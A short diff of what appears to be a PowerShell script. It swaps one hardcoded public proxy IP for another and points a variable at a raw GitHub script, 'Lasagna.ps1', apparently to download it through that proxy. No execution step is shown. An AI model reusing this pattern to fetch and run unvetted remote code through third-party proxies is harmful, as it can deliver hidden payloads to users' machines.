@@ -1,5 +1,5 @@
 # Set the proxy server information (replace with your proxy server details)
-$proxyServer = "50.168.163.183:80"
+$proxyServer = "50.217.226.43:80"
 
 # Set the URL of the raw GitHub script
 $githubScriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"
